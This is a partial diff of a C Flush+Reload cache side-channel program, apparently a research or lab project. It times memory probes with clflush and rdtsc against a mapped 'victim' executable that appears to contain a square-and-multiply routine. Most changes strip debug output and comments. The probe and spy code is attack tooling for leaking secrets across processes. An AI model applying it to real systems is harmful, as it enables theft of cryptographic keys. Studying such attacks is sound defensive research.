@@ -18,13 +18,7 @@
 // DaGe f+r implementation
 #define busy_wait(cycles) for(volatile long i_ = 0; i_ != cycles; i_++); // importance?
 
-//#define TESTEXEC_WINDOWS
 #define TESTEXEC_UBUNTU
-
-#define DEBUG
-//#define DEBUG_PLUS
-//#define DEBUG_TIME
-
 
 typedef struct node {
     char *adrs;
@@ -41,7 +35,6 @@ char *probe_path = "/home/jia/Documents/flush-reload/probe_adresses";
 int probe_treshold(char *adrs)
 {
     volatile unsigned long time;
-
     __asm__ __volatile__ (
         " mfence            \n"
         " lfence            \n"
@@ -54,19 +47,13 @@ int probe_treshold(char *adrs)
         " clflush 0(%1)     \n"
         : "=a" (time)
         : "c" (adrs)
-        : "%esi", "%edx");
-    #ifdef DEBUG_TIME
-    printf("measured time is %li\n", time);
-    #endif
+        : "%esi", "%edx"); 
     return time < THRESHOLD; 
 }
 
 int probe_precise(char *adrs)
 {
-    volatile unsigned long time;
-
-    // where are we using edx?
-    // when do we write something into %1?? and output (%0)
+    volatile unsigned long time;    
     __asm__ __volatile__ (
         " mfence            \n"
         " lfence            \n"
@@ -80,9 +67,6 @@ int probe_precise(char *adrs)
         : "=a" (time)
         : "c" (adrs)
         : "%esi", "%edx");
-    #ifdef DEBUG_TIME
-    printf("measured time is %li\n", time);
-    #endif
     return time; 
 }
 
@@ -193,22 +177,13 @@ void spy(char **target_adrs, int adrs_amount)
         tsc=rdtsc();
         while (tsc - old_tsc < 2500) // TODO why 2500/500 cycles per slot now, depending on printf
         {
-            //printf("waiting %llu cycles\n", (2500-tsc+old_tsc) / 50);
-            //busy_wait((2500-tsc+old_tsc) / 50);
             tsc = rdtsc();
         }
-        #ifdef DEBUG_PLUS
-        printf("system time counter: %llu, counter diff: %llu\n", tsc, tsc-old_tsc);
-        #endif
         for(int cur_adr_i=0;cur_adr_i<adrs_amount;cur_adr_i++)
         {
             char *ptr=target_adrs[cur_adr_i];
-            measurements[cur_adr_i][cur_slot]=probe(ptr); 
-            #ifdef DEBUG_PLUS
-            printf("measured value for adrs %p is %i\n", ptr, measurements[cur_adr_i][cur_slot]);                             // probe
-            #endif                                                                                            // add timing to array for persistence 
+            measurements[cur_adr_i][cur_slot]=probe(ptr);                                               // add timing to array for persistence 
         }
-                                                                                                        // wait 2500 cycles in ns current_probe_time asd (how?)
     }
     writer(target_adrs, adrs_amount, measurements);
     printf("end spy\n");
@@ -237,29 +212,13 @@ void lurk(void *base, char **target_adrs, int adrs_amount)
 
 void control()
 {
-    // addresses ------
-    #ifdef TESTEXEC_WINDOWS
-    int amount_address_offsets = 2;
-    int target_offset[2];
-    target_offset[0]    = 61;
-    target_offset[1]    = 84;
-
-    char* target_base = (char *) 0x555555555149; 
-    #endif
-    // base should be 0x100401080 (square_and_multiply) or 0x1004010fe (main)
-    // base linux 0x5555555551c7 main, 0x555555555149 sqm
-    
-    // --------------------
-
     FILE *file_pointer = fopen("/home/jia/Documents/flush-reload/victim", "r");
     int file_descriptor = fileno(file_pointer);     // hard coded path to open the executable used by the victim 
-    printf("fd has value %i\n", file_descriptor);
-    
     struct stat st_buf;
     fstat(file_descriptor, &st_buf);
     int map_len = st_buf.st_size;
     void *base = mmap(NULL, map_len, PROT_READ, MAP_SHARED, file_descriptor, 0); // MAP_FILE ignored (?)
-    //void *base = mmap(NULL, map_len, PROT_READ, MAP_FILE | MAP_SHARED, file_descriptor, 0); // MAP_FILE ignored (?)
+    
     if (base == MAP_FAILED) {
         perror("mmap failed!");
         exit(EXIT_FAILURE);
@@ -295,5 +254,3 @@ int main()
     control();   
     printf("finished\n");   
 }
-
-// compile without cygwin1.dll, execute with cygwin1.dll in System32
